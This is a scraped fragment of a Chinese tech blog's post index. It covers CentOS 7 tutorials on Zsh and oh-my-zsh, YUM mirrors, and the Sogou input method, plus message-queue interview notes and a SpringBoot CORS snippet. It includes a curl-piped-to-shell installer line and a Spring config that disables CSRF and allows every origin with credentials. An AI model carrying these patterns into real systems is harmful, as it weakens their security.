/var/lib/flatpak/app/com.leinardi.gwe/x86_64/stable/fd76222820472b18cf6d6733e8549da7b25f14266cde1d4ba7d6975f983db7f8/files/share/applications/com.leinardi.gwe.desktop /usr/share/applications/gwe.desktop# 通过按下 Alt + F2 快捷键，然后输入 r 重启界面，导航到应用程序 --&gt; 附件 --&gt; GreenWithEnvy，直接点击快捷方式启动应用 Deepin-Wine 安装 Deepin（深度）默认支持 Flatpak，因此可以通过 Flatpak 安装 Deepin 构建打包好的 Flatpak 应用。首先使用 Flatpak 安装 Deepin-Wine 容器，然后就可以安装 Deepin 官方提供的 TIM、微信、迅雷等常用应用了。实测虽然部分应用可以安装并使用，但实际使用起来不太稳定。具体安装步骤可参考：flatpak-deepinwine-gitee、Deepin-Wine 环境的 Ubuntu/Debian 移植版 参考博客 Flatpak 软件包新手指南 Linux 安装模式 AppImage,Flatpak,Snap 整理 真有用？Snap 和 Flatpak 通吃所有发行版的打包方式 三款新星 Linux 解决方案：Snappy、Flatpak 和 AppImage var isMobile = navigator.userAgent.match(/(phone|pad|pod|iPhone|iPod|ios|iPad|Android|Mobile|BlackBerry|IEMobile|MQQBrowser|JUC|Fennec|wOSBrowser|BrowserNG|WebOS|Symbian|Windows Phone)/i); if (!isMobile) { try { var plugin = new ReadmorePlugin(); plugin.init({ "type": "hexo", "id": "readmore-container", "name": "全栈技术驿站", "blogId": "96641-5333172926158-056", "qrcode": "https://www.techgrow.cn/img/wx_mp_qr.png", "keyword": "Tech", "random": "0.9", "height": "auto", "expires": "365", "lockToc": "yes", "interval": "30", "baseUrl": "" }); } catch(e) { console.warn("readmore plugin occurred error: " + e.name + " | " + e.message); } }',tags:"centos"},{title:"Centos7 安装 Zsh 与 Guake",url:"/posts/f83b3bd2.html",text:'Zsh 介绍 Shell 是在开发人员与服务器间建立一个桥梁，它对外提供一系列命令，让我们得以控制服务器。常用的 Bash 就是 Shell 的一种，也是 Linux 下默认 Shell 程序。Zsh 属于 Shell 中的一种，但比 Bash 好用，而且完全兼容 Bash，拥有及其丰富的插件、强大的命令自动补全能力、以及自定义功能，可以大大提供使用 Linux 的效率。 Zsh 安装 12345678# 安装依赖# yum install git curl wget# 查看是否存在zsh# cat /etc/shells# 如果zsh不存在，则安装zsh# yum install zsh 本地 Shell 切换到 Zsh 1234567891011121314151617# 以下操作，不同的Linux用户需要单独安装或者配置（YUM操作除外）# 查看当前shell# echo $SHELL# 切换shell到zsh# chsh -s /bin/zsh# 重启系统# reboot# 查看当前shell是否切换成功# echo $SHELL# 默认的zsh配置文件（自动生成）：~/.zshrc# 提示：切换到zsh后，以前在bash shell里添加的环境变量(~/.bashrc)可能会失效，此时需要在zsh的配置文件(~/.zshrc)中重新添加相关环境变量 解决切换到 Zsh 导致 Fcitx + 搜狗输入法无法使用的问题 123456789101112131415161718192021# 以下操作，不同的Linux用户需要单独安装或者配置（YUM操作除外）# 更改zsh的配置文件，添加fcitx相关的环境变量（不同的Linux用户需要单独配置）# vim ~/.zshrcexport XIM=fcitxexport GTK_IM_MODULE=fcitxexport QT_IM_MODULE=fcitxexport QT4_IM_MODULE=fcitxexport XMODIFIERS="@im=fcitx"# 设置GNOME的注册表（或者使用dconf-editor可视化工具来设置注册表）# gsettings set org.gnome.settings-daemon.plugins.xsettings overrides "{\'Gtk/IMModule\':&lt;\'fcitx\'&gt;}"# 重启系统# reboot# 如果上述方法都无法解决，那么可查看fcitx的错误日志信息来排查问题# cat ~/.config/fcitx/log/crash.log# 或者查看fcitx的安装状态，重点查看红色部分（错误）的日志信息# fcitx-diagnose Zsh 的一些骚气操作 123456789101. 连按两次 Tab 会列出所有的补全列表并直接开始选择，补全项可以使用 ctrl+n/p/f/b 上下左右切换2. 命令选项补全：在 zsh 中只需要键入 tar -&lt;tab&gt; 就会列出所有的选项和帮助说明3. 命令参数补全：键入 kill &lt;tab&gt; 就会列出所有的进程名和对应的进程号4. 更智能的历史命令：在用或者方向上键查找历史命令时，zsh 支持限制查找。比如，输入 ls，然后再按方向上键，则只会查找用过的 ls 命令。而此时使用则会仍然按之前的方式查找，忽略 ls5. 多个终端会话共享历史记录6. 智能跳转：安装了 autojump 之后，zsh 会自动记录你访问过的目录，通过 j 目录名 可以直接进行目录跳转，而且目录名支持模糊匹配和自动补全，例如你访问过 hadoop-1.0.0 目录，输入 j hado 即可正确跳转，输入 j --stat 可以看你的历史路径库7. 目录浏览和跳转：输入 d，即可列出你在这个会话里访问的目录列表，输入列表前的序号，即可直接跳转8. 在当前目录下输入 .. 或 ... ，或直接输入当前目录名都可以跳转，你甚至不再需要输入 cd 命令了。在你知道路径的情况下，比如 /usr/local/bin 你可以输入 cd /u/l/b 然后按进行补全快速输入9. 通配符搜索：ls -l **/*.sh，可以递归显示当前目录下的 shell 文件，文件少时可以代替 find，文件多的时候不建议使用10. 在 ~/.zshrc 中添加 setopt HIST_IGNORE_DUPS 可以消除重复记录，也可以利用 sort -t ";" -k 2 -u ~/.zsh_history | sort -o ~/.zsh_history 手动清除 oh-my-zsh 安装 Zsh 虽然炫酷，但是炫酷的背后是复杂的配置，有较高的使用门槛。oh-my-zsh 是一群开源爱好者一起维护的一套 Zsh 配置文件，专门为 Zsh 打造，简化了 Zsh 的使用细节。 1234567891011121314# 以下操作，不同的Linux用户需要单独安装或者配置（YUM操作除外）# 安装oh-my-zsh# sh -c "$(curl -fsSL https://raw.githubusercontent.com/robbyrussell/oh-my-zsh/master/tools/install.sh)"# 安装oh-my-zsh后，如果执行命令时提示：warning:cannot set LC_CTYPE locale，添加以下环境变量即可# vim ~/.zshrcexport LC_ALL=en_US.UTF-8export LC_CTYPE=en_US.UTF-8# 使环境变量生效# source ~/.zshrc# 默认安装位置：~/.oh-my-zsh oh-my-zsh 使用 agnoster 主题 oh-my-zsh 各种主题的显示效果可以点击这里查看。 123456789101112131415161718# 以下操作，不同的Linux用户需要单独安装或者配置（YUM操作除外）# 安装powerline字体# git clone https://github.com/powerline/fonts.git --depth=1# ./fonts/install.sh# rm -rf fonts# 验证powerline字体是否安装成功# echo "\\ue0b0 \\u00b1 \\ue0a0 \\u27a6 \\u2718 \\u26a1 \\u2699"# 更改zsh的主题，如果将值设为空，表示不使用任何主题，也可以设置为"random"，每次打开终端都会随机选择一种主题# vim ~/.zshrcZSH_THEME="agnoster"# 使配置生效# source ~/.zshrc# 字体powerline的安装路径：~/.local/share/fonts oh-my-zsh 安装自定义插件 oh-my-zsh 提供了完善的插件体系，相关的插件文件在 /.oh-my-zsh/plugins 目录下，默认提供了 100 多种插件，可以根据自己的实际学习和工作环境选择性采用。oh-my-zsh 的插件也是在 /.zshrc 里配置，找到 plugins 关键字，添加自己的插件即可，也可以采用以下的方法安装自定义的插件，系统默认加载了 git 插件。最后，虽然 oh-my-zsh 提供了很多插件，不过也不要贪多，加载大量的插件会拖慢 oh-my-zsh 的运行速度，因此建议按自己的实际需求加载插件。 12345678910111213141516171819# 以下操作，不同的Linux用户需要单独安装或者配置（YUM操作除外）# 安装自动提示插件# git clone https://github.com/zsh-users/zsh-autosuggestions ~/.oh-my-zsh/custom/plugins/zsh-autosuggestions# 安装语法高亮插件# git clone https://github.com/zsh-users/zsh-syntax-highlighting.git ~/.oh-my-zsh/custom/plugins/zsh-syntax-highlighting# 文件授权# chmod -R 755 ~/.oh-my-zsh/custom/plugins# 启用插件# vim ~/.zshrcplugins=(git zsh-autosuggestions zsh-syntax-highlighting)# 使配置生效# source ~/.zshrc# 自定义插件的安装路径：~/.oh-my-zsh/custom/plugins oh-my-zsh 安装 autojump 插件 autojump 是一个命令行工具，它可以使用快捷命令直接跳转到预配置好或者曾经进入过的目录，而不用管当前处在哪个目录下；默认是通过记录目录路径到本地文件或者数据库来实现，所以必须是预配置好或者曾经进入过的目录才能跳转。类似的命令行工具还有 z.lua。 1234567891011121314# 以下操作，不同的Linux用户需要单独安装或者配置（YUM操作除外）# 安装# yum instal autojump autojump-zsh# 启用插件# vim ~/.zshrcplugins=(git zsh-autosuggestions zsh-syntax-highlighting autojump)# 使配置生效# source ~/.zshrc# 查看是否运行正常# j --stat ZSH 隐藏命令行前面的用户名和主机名 1234567891011121314151617181920212223242526272829# 以下操作，不同的Linux用户需要单独安装或者配置（YUM操作除外）# 修改ZSH的配置文件，在文件末尾追加以下内容（下面四种方式任意选一种即可）# vim ~/.zshrc# 第一种方式：隐藏用户名和主机名prompt_context() {}# 第二种方式：使用任意自定义字符串作为用户名和主机名prompt_context() { prompt_segment black default "xxxx"}# 第三种方式：只保留用户名，隐藏主机名prompt_context() { if [[ "$USER" != "$DEFAULT_USER" || -n "$SSH_CLIENT" ]]; then prompt_segment black default "%(!.%{%F{yellow}%}.)$USER" fi}# 第四种方式：只保留主机名，隐藏用户名prompt_context() { if [[ "$USER" != "$DEFAULT_USER" || -n "$SSH_CLIENT" ]]; then prompt_segment black default "%(!.%{%F{yellow}%}.)$HOST" fi}# 使配置生效# source ~/.zshrc 解决 oh-my-zsh + git 响应慢 / 卡顿的问题 12345678# 进入git项目的根目录# cd git-project# 设置不读取文件变化信息# git config --add oh-my-zsh.hide-dirty 1# 或者不读取任何git信息（速度更快）# git config --add oh-my-zsh.hide-status 1 解决切换主题后，终端显示乱码的问题 1231. 运行终端2. 导航到菜单栏 --&gt; 编辑 --&gt; 首选项 --&gt; 文本 --&gt; 自定义字体，选择powerline字体，否则agnoster主题的箭头会显示乱码3. 导航到菜单栏 --&gt; 编辑 --&gt; 首选项 --&gt; 颜色 --&gt; 调色板，选择内置方案，更改终端的不同显示样式（可选操作） Guake 安装 Guake 是一个下拉式的 GNOME 桌面环境下的终端程序，只需要按一个键就可以调用出终端界面，失去焦点后会自动隐藏掉。当有些时候需要临时执行一两个命令，但是又不想额外启动一个终端的情况下，Guake 是个不错的选择。Guake 还支持快捷键、标签、背景透明、背景图片等特性。 123456789# 安装guake# yum install guake# 导航到应用程序 --&gt; 系统工具 --&gt; Guake Terminal，点击即可启动Guake；或者按下F12即可调出Guake，再次按下F12即可隐藏掉# 配置guake$ guake-prefs# 提示：Guake完美支持oh-my-zsh，具体配置方法与上面给出的终端配置（解决终端显示乱码）大致相同 oh-my-zsh 最终运行效果图 var isMobile = navigator.userAgent.match(/(phone|pad|pod|iPhone|iPod|ios|iPad|Android|Mobile|BlackBerry|IEMobile|MQQBrowser|JUC|Fennec|wOSBrowser|BrowserNG|WebOS|Symbian|Windows Phone)/i); if (!isMobile) { try { var plugin = new ReadmorePlugin(); plugin.init({ "type": "hexo", "id": "readmore-container", "name": "全栈技术驿站", "blogId": "96641-5333172926158-056", "qrcode": "https://www.techgrow.cn/img/wx_mp_qr.png", "keyword": "Tech", "random": "0.9", "height": "auto", "expires": "365", "lockToc": "yes", "interval": "30", "baseUrl": "" }); } catch(e) { console.warn("readmore plugin occurred error: " + e.name + " | " + e.message); } }',tags:"centos"},{title:"Centos7 管理 YUM 源与 EPEL 源",url:"/posts/4688dc15.html",text:'YUM 相关的配置文件及目录 123主配置文件：/etc/yum.conf资源库配置目录：/etc/yum.repos.d重要文件： /etc/yum.repos.d/CentOS-Base.repo YUM 安装加速插件 12345678910111213# 安装axelget插件# yum install axel yum-plugin-fastestmirror yum-axelget# 如果临时不想启用axelget插件，可参考以下命令# yum --disableplugin=axelget YumCommand# 更改axelget插件默认的并发下载线程数，编辑Python源码文件，修改以下内容即可# vim /usr/lib/yum-plugins/axelget.pymaxconn = 15maxconn = conduit.confInt(\'main\', \'maxconn\', default=15)# 查看实际并发下载的效果# yum --debuglevel=3 YumCommand 添加常用的 YUM 源 1234567891011121314151617181920# 添加epel源# yum install epel-release# 添加nux-dextop源# rpm -Uvh http://li.nux.ro/download/nux/dextop/el7/x86_64/nux-dextop-release-0-5.el7.nux.noarch.rpm# 添加rpmfusion free源# yum localinstall http://download1.rpmfusion.org/free/el/rpmfusion-free-release-7.noarch.rpm# 添加rpmfusion nonfree源（闭源软件的源，不建议使用）# yum localinstall http://download1.rpmfusion.org/nonfree/el/rpmfusion-nonfree-release-7.noarch.rpm# 清理数据# yum clean all# 生成缓存# yum makecache# 查看已安装的源# yum repolist 配置 YUM 源为阿里云镜像源 1234567891011121314151617# 备份YUM源# mv /etc/yum.repos.d/CentOS-Base.repo /etc/yum.repos.d/CentOS-Base.repo.bak# 下载阿里云的YUM源# wget -O /etc/yum.repos.d/CentOS-Base.repo http://mirrors.aliyun.com/repo/Centos-7.repo# 或者# curl -o /etc/yum.repos.d/CentOS-Base.repo http://mirrors.aliyun.com/repo/Centos-7.repo# 清理数据# yum clean all# 生成缓存# yum makecache# 查看已安装的源# yum repolist Centos 其他版本的配置 对于 Centos 不同的版本，更换 CentOS-Base.repo 文件的命令如下。 1234wget -O /etc/yum.repos.d/CentOS-Base.repo http://mirrors.aliyun.com/repo/Centos-5.repowget -O /etc/yum.repos.d/CentOS-Base.repo http://mirrors.aliyun.com/repo/Centos-6.repowget -O /etc/yum.repos.d/CentOS-Base.repo http://mirrors.aliyun.com/repo/Centos-7.repowget -O /etc/yum.repos.d/CentOS-Base.repo http://mirrors.aliyun.com/repo/Centos-8.repo 配置 EPEL 源为阿里云镜像源 12345678910111213141516171819# 备份EPEL源# cp /etc/yum.repos.d/epel-7.repo /etc/yum.repos.d/epel-7.repo.bak# 下载阿里云的EPEL源# wget -O /etc/yum.repos.d/epel-7.repo https://mirrors.aliyun.com/repo/epel-7.repo# 或者# curl -o /etc/yum.repos.d/epel-7.repo https://mirrors.aliyun.com/repo/epel-7.repo# 清理数据# yum clean all# 生成缓存# yum makecache# 查看已安装的源# yum repolist# 提示:配置EPEL源为阿里云镜像源后,依然可以正常使用"yum install epel-release"命令安装EPEL源 Centos7 卸载 EPEL 源 12345678910111213141516171819# 查找epel已安装的rpm包# rpm -qa | grep epel# 卸载epel已安装的rpm包# yum remove epel-release-7-11.noarch# 确保epel相关文件已删除# rm /etc/yum.repos.d/epel.repo# rm /etc/yum.repos.depel-testing.repo# rm /etc/pki/rpm-gpg/RPM-GPG-KEY-EPEL-7# 清理数据# yum clean all# 生成缓存# yum makecache# 查看已安装的源# yum repolist 禁用 YUM 源 1234567891011121314# 查看所有仓库源# yum repolist all# 查看所有已启用的仓库源# yum repolist# 更新软件，并临时禁用某个仓库源# yum --disablerepo=Atom update -y# 永久启用某个仓库源# yum-config-manager --enable Atom# 永久禁用某个仓库源# yum-config-manager --disable Atom Docker 镜像配置 YUM 源为阿里云镜像源 若希望 Docker 的 Centos7 镜像配置 YUM 源为阿里云镜像源，可以参考以下的 Dockerfile 内容。 123456789101112131415FROM centos:7MAINTAINER clay&lt;clay@gmail.com&gt;# 下载软件源ADD http://mirrors.aliyun.com/repo/Centos-7.repo /etc/yum.repos.d# 更新软件源RUN mv /etc/yum.repos.d/CentOS-Base.repo /etc/yum.repos.d/CentOS-Base.repo.bak \\ &amp;&amp; mv /etc/yum.repos.d/Centos-7.repo /etc/yum.repos.d/CentOS-Base.repo \\ &amp;&amp; yum clean all -y \\ &amp;&amp; yum makecache -y \\ &amp;&amp; yum update -y# 其他操作（省略） var isMobile = navigator.userAgent.match(/(phone|pad|pod|iPhone|iPod|ios|iPad|Android|Mobile|BlackBerry|IEMobile|MQQBrowser|JUC|Fennec|wOSBrowser|BrowserNG|WebOS|Symbian|Windows Phone)/i); if (!isMobile) { try { var plugin = new ReadmorePlugin(); plugin.init({ "type": "hexo", "id": "readmore-container", "name": "全栈技术驿站", "blogId": "96641-5333172926158-056", "qrcode": "https://www.techgrow.cn/img/wx_mp_qr.png", "keyword": "Tech", "random": "0.9", "height": "auto", "expires": "365", "lockToc": "yes", "interval": "30", "baseUrl": "" }); } catch(e) { console.warn("readmore plugin occurred error: " + e.name + " | " + e.message); } }',tags:"centos"},{title:"Centos7 安装搜狗输入法",url:"/posts/26aba73.html",text:'前言 本教程只适用于 Centos7 安装搜狗输入法（v2.2.0.0108），支持的桌面环境是 GNOME。注：文章末尾附有搜狗输入法最终的运行效果图 系统环境 12CentOS Linux release 7.6.1810 (Core)Linux centos7.6 3.10.0-957.5.1.el7.x86_64 #1 SMP Fri Feb 1 14:54:57 UTC 2019 x86_64 x86_64 x86_64 GNU/Linux 安装 Fcitx 输入法框架 12345678910111213141516171819202122# 关闭ibus输入法，绝对不能使用“yum remove ibus”命令卸载ibus, 否则会将桌面环境一同卸载掉# mv /usr/bin/ibus-daemon /usr/bin/ibus-daemon.bak# 安装fcitx# yum install libQtWebKit* fcitx fcitx-libs fcitx-qt4 fcitx-qt5 fcitx-configtool fcitx-table fcitx-table-chinese# 如果上面的fcitx-qt5因依赖关系无法安装，则可以安装qt5-qtbase来替代# yum install qt5-qtbase# 配置环境变量（主要是为了解决GTK/Qt程序无法切换输入法）# vim /etc/profileexport XIM=fcitxexport GTK_IM_MODULE=fcitxexport QT_IM_MODULE=fcitxexport QT4_IM_MODULE=fcitxexport XMODIFIERS="@im=fcitx"# 重启系统使环境变量生效，并关闭ibus# reboot# 查看fcitx的安装状态（使用普通用户身份运行），重点查看红色部分（错误）的日志信息$ fcitx-diagnose 安装搜狗输入法 12345678910111213141516171819202122232425262728# 安装alien# yum install alien# 下载deb包# wget http://cdn2.ime.sogou.com/dl/index/1524572264/sogoupinyin_2.2.0.0108_amd64.deb?st=EPtVkvlW9rLVsn-jtfOGbA&amp;e=1568569239&amp;fn=sogoupinyin_2.2.0.0108_amd64.deb# 转换rpm包# alien -r sogoupinyin_2.2.0.0108_amd64.deb# 安装搜狗输入法# rpm -ivh --force sogoupinyin-2.2.0.0108-2.x86_64.rpm# 拷贝库文件# cp -R /usr/lib/x86_64-linux-gnu/fcitx/* /usr/lib64/fcitx/# 库文件授权# chmod -R 755 /usr/lib64/fcitx/# 启动fcitx$ fcitx# 开机自启动fcitx# 导航到应用程序 --&gt; 附件 --&gt; 优化工具 --&gt; 开机启动程序，设置fcitx为开机自启动# 配置fcitx，添加搜狗输入法$ fcitx-configtool# 提示：fcitx成功添加搜狗输入法后，正常情况下可以通过快捷键ctrl + 空格调出搜狗输入法 解决搜狗输入法无法运行或者切换失败的问题 1234567891011121314# 一般是sogou-qimpanel启动失败导致，首先删除搜狗输入法的相关配置文件，然后重启搜狗输入法或者重启系统$ rm -rf ~/.config/SogouPY$ rm -rf ~/.config/SogouPY.users$ rm -rf ~/.config/sogou-qimpanel# 重启fcitx与搜狗输入法（杀死下面的应用进程后，由于存在守护进程的缘故，应用进程会自动重启）$ killall fcitx$ killall sogou-qimpanel# 如果搜狗输入法还是无法正常运行，尝试设置GNOME的注册表（或者使用dconf-editor可视化工具来设置注册表），设置完之后重启系统$ gsettings set org.gnome.settings-daemon.plugins.xsettings overrides "{\'Gtk/IMModule\':&lt;\'fcitx\'&gt;}"# 如果上述方法都无法解决，那么可查看fcitx的错误日志信息来排查问题$ cat ~/.config/fcitx/log/crash.log 安装其他输入法（可选操作，未验证） 1234567891011# 标准拼音输入法# yum install fcitx-pinyin# 中州韵输入法# yum install fcitx-rime fcitx-cloudpinyin# 谷歌拼音输入法# yum install fcitx-googlepinyin fcitx-cloudpinyin# sunpinyin输入法# yum install fcitx-sunpinyin sunpinyin-data fcitx-cloudpinyin 新增输入法的皮肤（可选操作） 12345678910111213# fcitx经典皮肤的目录路径# /usr/share/fcitx/skin# ~/.config/fcitx/skin# sogou-qimpanel皮肤的目录路径# /usr/share/sogou-qimpanel/skin# 搜狗全平台通用ssf格式皮肤的目录路径# /usr/share/sogou-qimpanel/recommendSkin/skin# ~/.config/sogou-qimpanel/skin# 搜狗输入法皮肤下载：https://pinyin.sogou.com/skins/# 提示：可从搜狗输入法官网下载新皮肤到上述对应的目录下（区分Linux用户），目前非Ubuntu系的Linux发行版跟搜狗输入法的皮肤(sff格式)不兼容，实测Centos7无法正常使用搜狗输入法的皮肤安装功能 新增搜狗输入法词库（可选操作） 123456789101112131415161718192021# 下载词库（https://pinyin.sogou.com/dict/）$ wget http://download.pinyin.sogou.com/dict/download_cell.php?id=22408&amp;name=电视剧名大全# 拷贝词库文件$ cp 电视剧名大全.scel ~/.config/SogouPY/scd# 重命名词库文件，格式为：数字.scel$ mv ~/.config/SogouPY/scd/电视剧名大全.scel ~/.config/SogouPY/scd/15279.scel# 编辑词库配置文件，添加以下内容（其中scd的序号必须唯一，id必须与词库的文件名一致）$ vim ~/.config/SogouPY/scdlist.ini[scd4]id=15279name=电视剧名大全type=电视剧名大全# 重启fcitx与搜狗输入法（杀死下面的应用进程后，由于存在守护进程的缘故，应用进程会自动重启）$ killall fcitx$ killall sogou-qimpanel# 导航到搜狗输入法 --&gt; 设置 --&gt; 词库，如果成功添加词库，那么界面上会显示新添加的词库类型 使用 im-chooser 切换输入法（可选操作，不建议） 12345678910111213# 仅供参考，亲测Centos7环境下不一定能保证切换成功；当fcitx安装成功，并添加了搜狗输入法，那么正常情况下可以通过快捷键ctrl + shift来切换不同的输入法# 安装im-chooser# yum install im-chooser# 切换输入法为fcitx$ imsettings-switch fcitx# 如果无法切换至指定的输入法，可以查看imsettings的日志来排查问题$ cat ~/.cache/imsettings/log# 检查imsettings设置$ imsettings-info 最终效果图 参考博客 Centos7.2 安装搜狗拼音 Sogou Pinyin 安装过程常见的问题 CentOS 7 输入中文 &amp; 安装搜狗输入法 Fedora20 安装搜狗输入法及各种问题的解决 Fedora 29/30 安装 FCITX 输入法 + Rime / 拼音 非 Ubuntu 系发行版跟搜狗输入法的皮肤不兼容 var isMobile = navigator.userAgent.match(/(phone|pad|pod|iPhone|iPod|ios|iPad|Android|Mobile|BlackBerry|IEMobile|MQQBrowser|JUC|Fennec|wOSBrowser|BrowserNG|WebOS|Symbian|Windows Phone)/i); if (!isMobile) { try { var plugin = new ReadmorePlugin(); plugin.init({ "type": "hexo", "id": "readmore-container", "name": "全栈技术驿站", "blogId": "96641-5333172926158-056", "qrcode": "https://www.techgrow.cn/img/wx_mp_qr.png", "keyword": "Tech", "random": "0.9", "height": "auto", "expires": "365", "lockToc": "yes", "interval": "30", "baseUrl": "" }); } catch(e) { console.warn("readmore plugin occurred error: " + e.name + " | " + e.message); } }',tags:"centos"},{title:"消息队列面试题之一",url:"/posts/f7fd0987.html",text:'消息积压消息积压概述消息的积压来自于两方面：要么发送快了，要么消费变慢了 监控发现，生产和消费消息的速度没什么变化，出现消息积压的情况，检查是有消费失败反复消费的情况。 监控发现，消费消息的速度变慢，检查消费实例，日志中是否有大量消费错误、消费线程是否死锁、是否卡在某些资源上。 单位时间内发送的消息增多，比如赶上大促或者抢购，短时间内不太可能优化消费端的代码来提升消费性能，但可以通过扩容消费端的实例数来提升总体的消费能力。 如果短时间内没有服务器资源扩容，可以将系统降级，通过关闭某些不重要的业务，减少消息发送的数据量，最低限度让系统还能正常运转，保证核心业务的可用性。 严重影响 QM 甚至整个系统时，可以考虑临时启用多个消费者，并发接受消息，持久化之后回头让生产者重新生产消息，或者极端情况下直接丢弃消息。 消息积压扩容方案利用临时消费者，消费原来积压队列中的消息。该消费者不做任何耗时的操作，将消息均匀写入新创建的队列里，最后将更多 Consumer 部署到更多的机器上消费新创建队列上的消息。等待积压的消息被消费，恢复到正常状态，撤掉扩容服务器。具体步骤和思路如下： 先修复 Consumer 的问题，确保其恢复正常的消费速度，然后将现有 Consumer 都停止 临时建立好原先 10 倍或者 20 倍的 Queue 数量 写一个临时的分发数据的 Consumer 程序，这个程序部署上去消费积压的数据，消费之后不做耗时的处理，直接均匀轮询写入临时建立好的 10 倍数量的 Queue 接着临时征用 10 倍机器来部署 Consumer，每一批 Consumer 消费一个临时 Queue 的数据 这种做法相当于临时将 Queue 资源和 Consumer 资源扩大了 10 倍，即以正常的 10 倍速度消费积压的消息，扩容前后如下图所示： 消息积压真实场景场景一：大量消息积压，并且设置了过期时间 假设用的是 RabbitMQ，由于 RabbitMQ 是可以设置过期时间的（TTL），如果消息在 Queue 中积压超过一定的时间，就会被 RabbitMQ 清理掉。这个时候就不是消息被大量积压的问题，而是大量的消息被直接搞丢了。这种情况下，就不是说要增加 Consumer 消费积压的消息，因为实际上消息是没有积压的，而是丢了大量的消息，此时可以采取的一个方案就是批量重导。当大量的消息积压的时候，由于设置了过期时间，RabbitMQ 会直接丢弃数据，然后等业务高峰期过了之后，例如在晚上 12 点以后，写个临时程序将丢失的那批数据查询出来，然后重新将消息写入 RabbitMQ 里，即把白天丢的消息全部补回来。假设 10000 个订单积压在 RabbitMQ 里面，没有来得及处理掉，其中 2000 个订单都丢了，那么只能手动写个临时程序把那 2000 个订单查询出来，然后手动发送消息到 RabbitMQ 中重新进行消费。 场景二：大量消息积压，导致 MQ 磁盘满了 消息积压在 MQ 里，那么如果很长时间都没有处理掉，此时导致 MQ 都快写满了，那应该怎么办？这个时候可以写一个临时程序，启用多个消费者，并发接受消息，同时持久化消息，即快速消费掉 MQ 中积压的消息。到凌晨的时候，将持久化的消息重新写回 MQ 中进行消费；如果希望加快已持久化消息的消费速度，可以引入上述的消息积压扩容方案。 var isMobile = navigator.userAgent.match(/(phone|pad|pod|iPhone|iPod|ios|iPad|Android|Mobile|BlackBerry|IEMobile|MQQBrowser|JUC|Fennec|wOSBrowser|BrowserNG|WebOS|Symbian|Windows Phone)/i); if (!isMobile) { try { var plugin = new ReadmorePlugin(); plugin.init({ "type": "hexo", "id": "readmore-container", "name": "全栈技术驿站", "blogId": "96641-5333172926158-056", "qrcode": "https://www.techgrow.cn/img/wx_mp_qr.png", "keyword": "Tech", "random": "0.9", "height": "auto", "expires": "365", "lockToc": "yes", "interval": "30", "baseUrl": "" }); } catch(e) { console.warn("readmore plugin occurred error: " + e.name + " | " + e.message); } }',tags:"面试"},{title:"SpringBoot 常用代码块",url:"/posts/f023325d.html",text:'跨域SpringBoot + Security 跨域12345678910111213141516171819202122232425262728293031323334353637import org.springframework.context.annotation.Bean;import org.springframework.context.annotation.Configuration;import org.springframework.security.config.annotation.web.builders.HttpSecurity;import org.springframework.security.config.annotation.web.configuration.WebSecurityConfigurerAdapter;import org.springframework.web.cors.CorsConfiguration;import org.springframework.web.cors.UrlBasedCorsConfigurationSource;import org.springframework.web.filter.CorsFilter;/** * Web 安全配置 */@Configurationpublic class WebSecurityConfig extends WebSecurityConfigurerAdapter { @Override protected void configure(HttpSecurity http) throws Exception { http.cors().and().csrf().disable().authorizeRequests().antMatchers("/**").permitAll(); } /** * 允许跨域 * * @return */ @Bean public CorsFilter corsFilter() { UrlBasedCorsConfigurationSource source = new UrlBasedCorsConfigurationSource(); CorsConfiguration corsConfiguration = new CorsConfiguration(); corsConfiguration.addAllowedOrigin("*"); corsConfiguration.addAllowedHeader("*"); corsConfiguration.addAllowedMethod("*"); corsConfiguration.setAllowCredentials(true); source.registerCorsConfiguration("/**", corsConfiguration); return new CorsFilter(source); }} var isMobile = navigator.userAgent.match(/(phone|pad|pod|iPhone|iPod|ios|iPad|Android|Mobile|BlackBerry|IEMobile|MQQBrowser|JUC|Fennec|wOSBrowser|BrowserNG|WebOS|Symbian|Windows Phone)/i); if (!isMobile) { try { var plugin = new ReadmorePlugin(); plugin.init({ "type": "hexo", "id": "readmore-container", "name": "全栈技术驿站", "blogId": "96641-5333172926158-056", "qrcode": "https://www.techgrow.cn/img/wx_mp_qr.png", "keyword": "Tech", "random": "0.9", "height": "auto", "expires": "365", "lockToc": "yes", "interval": "30", "baseUrl": "" }); } catch(e) { console.warn("readmore plugin occurred error: " + e.name + " | " + e.message); } }',tags:"java 开发随笔"},{title:"Centos7 安装常用桌面软件",url:"/posts/3f15d076.html",text:'前言 本文主要介绍 Centos7 如何安装微信客户端、网易云音乐、百度网盘、TeamViewer、Rhythmbox 等桌面软件。 添加 YUM 源 添加 epel，nux-dextop，rpmfusion 源，可参考本站教程：Centos7 管理 YUM 源 electronic-wechat 微信客户端 electronic-wechat 是一款基于 Web 版微信开发的第三方微信客户端，自带消息防撇回功能。由于 Web 版的微信会限制新注册的微信账号登录，因此 electronic-wechat 同样不支持微信新账号登录。该项目由于各种原因已经停止维护，但并不影响正常使用，实测使用非常稳定。 electronic-wechat github electronic-wechat releases 123456789101112131415161718192021222324252627282930# 进入安装目录# cd /usr/local# 下载已编译的安装包$ wget https://github.com/kooritea/electronic-wechat/releases/download/v2.3.1/electronic-wechat-linux-x64-2.3.1.zip# 解压文件# unzip electronic-wechat-linux-x64-2.3.1.zip# 删除文件# rm -rf electronic-wechat-linux-x64-2.3.1.zip# 文件授权# chown -R peter:peter electronic-wechat-linux-x64# 使用普通用户身份运行应用（可以使用快捷键ctrl + c退出程序）$ ./electronic-wechat-linux-x64/electronic-wechat# 创建应用菜单栏的快捷方式# vim /usr/share/applications/electronic-wechat.desktop[Desktop Entry]Name=Electronic WechatComment=Unofficial WeChat client built with React, MobX and Electron.Exec=/usr/local/electronic-wechat-linux-x64/electronic-wechat %UIcon=/usr/local/electronic-wechat-linux-x64/assets/icon.pngTerminal=falseType=ApplicationCategories=Network;Chat;# 导航到：应用程序 --&gt; 互联网 --&gt; Electronic Wechat，直接点击快捷方式启动应用，效果图如下 网易云音乐 建议直接使用 Snap 或者 Flatpak 安装网易云音乐，网上解压 deb 包的安装方法大多数无法安装成功，主要是相关依赖不容易安装导致。下面主要介绍如果通过 Snap 安装网易云音乐，其中 Snap 的安装可参考本站教程，Snap 安装完成后执行以下步骤安装网易云音乐即可，整个安装过程非常简单，以后管理应用也很方便。 123456789101112131415161718192021222324# 安装网易云音乐（Snap的下载速度较慢，耐心等待安装完成即可）# snap install netease-music --devmode --beta# 查看安装状态# snap list# 创建快捷方式# vim /usr/share/applications/netease-music.desktop[Desktop Entry]Type=ApplicationName=Netease-musicGenericName=Netease-musicComment=Music player for netease cloud 